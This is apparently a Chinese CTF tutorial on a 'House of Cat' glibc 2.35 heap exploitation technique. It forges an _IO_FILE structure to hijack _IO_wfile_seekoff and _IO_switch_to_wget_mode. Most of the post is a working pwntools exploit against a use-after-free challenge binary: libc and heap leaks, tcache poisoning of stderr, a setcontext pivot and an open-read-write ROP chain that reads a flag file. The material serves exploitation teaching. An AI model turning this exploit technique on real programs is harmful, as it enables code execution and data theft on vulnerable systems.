Do you like cats？
因为 glibc 版本越来越高，以往的利用方法大部分都已经失效。glibc2.34 以后几个常用的钩子函数被完全的禁止了。现在需要找到一种新的 IO 函数调用，可以绕过 TLS上 _pointer_chk_guard 的相关检测。查看源码可以知道， vtable 的检查越来越完善。之前很多师傅都提出了一些优秀的攻击方法。
先看 _IO_FILE 成员偏移：
图0
这次将目光转向 _IO_wfile_jumps 结构体。
图1
_IO_wfile_seekoff 函数：
图seekoff
如果 mode != 0 且 fp -> _wide_data -> _IO_write_ptr > fp -> _wide_data -> _IO_write_base 会调用 _IO_switch_to_wget_mode 这个函数。
_IO_switch_to_wget_mode 函数：
图
如果 fp -> _wide_data -> _IO_write_ptr > fp -> _wide_data -> _IO_write_base 会调用 _IO_WOVERFLOW 这个 glibc里定义的一个宏调用函数。
先来看看汇编：
图2
mov    rax,QWORD PTR [rdi+0xa0]
mov    rdx,QWORD PTR [rax+0x20]
mov    rax,QWORD PTR [rax+0xe0]
call   QWORD PTR [rax+0x18]
可以看到这里的寄存器 rdi rax rdx rip 都是可以控制的。
综上所述伪造 fake_IO_FILE 结构体并且控制成员变量就可以执行任意函数。需要绕过的检测是：
fake_IO_FILE -> _wide_data -> _IO_read_ptr != fake_IO_FILE -> _wide_data -> _IO_read_end
fake_IO_FILE -> _wide_data -> _IO_write_ptr > fake_IO_FILE -> _wide_data -> _IO_write_base
fake_IO_FILE -> _lock 是一个可写地址
fake_IO_FILE -> _mode = 0
模板：
fake_IO_FILE  = p64(0) # _IO_read_end
fake_IO_FILE += p64(0) # _IO_read_base
fake_IO_FILE += p64(0) # _IO_write_base
fake_IO_FILE += p64(0) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end
fake_IO_FILE += p64(0) # _IO_buf_base
fake_IO_FILE += p64(1) + p64(0) # _IO_buf_base != _IO_buf_end
fake_IO_FILE += p64(context_addr) # rdx-> context_addr
fake_IO_FILE += p64(setcontext_door) # _IO_save_end = call(setcontext + 61)
fake_IO_FILE  = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE  = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heapbase + 0x200)  # _lock = writable address
fake_IO_FILE  = fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE += p64(IO_FILE_addr + 0x30) # _wide_data = rax1
fake_IO_FILE  = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(_IO_wfile_jumps + 0x10) # vtable = _IO_wfile_overflow
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(IO_FILE_addr + 0x40)  # rax2

对于开了沙盒的 orw 利用思路：
1.泄露 libc 地址和 heap 地址
2.用 largebin attack 或者 tcache attack 修改 stderr 指向 fake_IO_FILE( stderr 在 libc 而不在 bss 才行) 和 top chunk's size
3.伪造 fake_IO_FILE
4.触发 __malloc_assert ，进入 _IO_wfile_seekoff 转到 _IO_switch_to_wget_mode。
5.setcontext 执行 orw 链。

接下来用一个自己魔改的例子说明（tcache attack，glibc2.35）：
保护全开，但存在 UAF。
图 3 4
利用上面思路写 exp：

#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
p = process('./UAF-ORW35')
libc = ELF('./libc.so.6')
elf = ELF('./UAF-ORW35')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length,content='A'):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
	p.sendafter('Please input content:',content)

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

add(0x420) #0
add(0x400) #1
delete(0)  # 放入 unsoretedbin

show(0)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x219ce0 # unsoretedbin 与 libc 偏移 == 0x219ce0
pr('libcbase',libcbase)

add(0x400) #2 
delete(0) # tcachebin

show(0)
key = u64(p.recv(6).ljust(8, "\x00")) # heap >> 12
heapbase = key << 12
pr('heapbase',heapbase)
pr('key',key)

syscall_ret = libcbase + libc.search(asm('syscall\nret')).next()
_IO_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']
setcontext_door = libcbase + libc.sym['setcontext'] + 61
stderr = libcbase + libc.sym['stderr']
bss_addr = libcbase + libc.bss()
prdx_ret = libcbase + 0x11f497 # pop rdx ; pop r12 ; ret
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret
prsi_ret = libcbase + 0x2be51  # pop rsi ; ret
prax_ret = libcbase + 0x45eb0  # pop rax ; ret
ret = prdi_ret + 1 # ret

edit(0,'a'*0x40)
delete(0)
edit(0,p64(stderr ^ key))
add(0x400,p64(stderr ^ key)) #3
add(0x400,p64(heapbase + 0x290)) #4 修改 stderr 指向 fake_IO_FILE

delete(0)
edit(0,'b'*0x40)
delete(0)
top_size_addr = heapbase + 0xad0
edit(0,p64(top_size_addr ^ key))
add(0x400,p64(top_size_addr ^ key)) #5
add(0x400,p64(0) + p64(0x301)) #6 修改 top chunk 大小

context_addr  = heapbase + 0x6d0
IO_FILE_addr  = heapbase + 0x290
fake_IO_FILE  = p64(0) # _IO_read_end
fake_IO_FILE += p64(0) # _IO_read_base
fake_IO_FILE += p64(0) # _IO_write_base
fake_IO_FILE += p64(0) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end
fake_IO_FILE += p64(0) # _IO_buf_base
fake_IO_FILE += p64(1) + p64(0) # _IO_buf_base != _IO_buf_end
fake_IO_FILE += p64(context_addr) # rdx-> context_addr
fake_IO_FILE += p64(setcontext_door) # _IO_save_end = call(setcontext + 61)
fake_IO_FILE  = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE  = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heapbase + 0x200)  # _lock = writable address
fake_IO_FILE  = fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE += p64(IO_FILE_addr + 0x30) # _wide_data = rax1
fake_IO_FILE  = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(_IO_wfile_jumps + 0x10) # vtable = _IO_wfile_overflow
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(IO_FILE_addr + 0x40)  # rax2

frame = SigreturnFrame()
frame.rsp  = context_addr + 0x100 # rsp -> orw
frame.rip  = ret

payload  = str(frame)
payload  = payload.ljust(0x100,'\x00')

flag_addr = context_addr + 0x200
# open
payload += p64(prdi_ret) + p64(flag_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)
payload  = payload.ljust(0x200,'\x00') + './flag\x00\x00'

edit(0,fake_IO_FILE)
edit(1,payload)

p.sendlineafter(':','1')
p.sendlineafter('len:',str(0x460))
p.interactive()

成功getflag：
图5


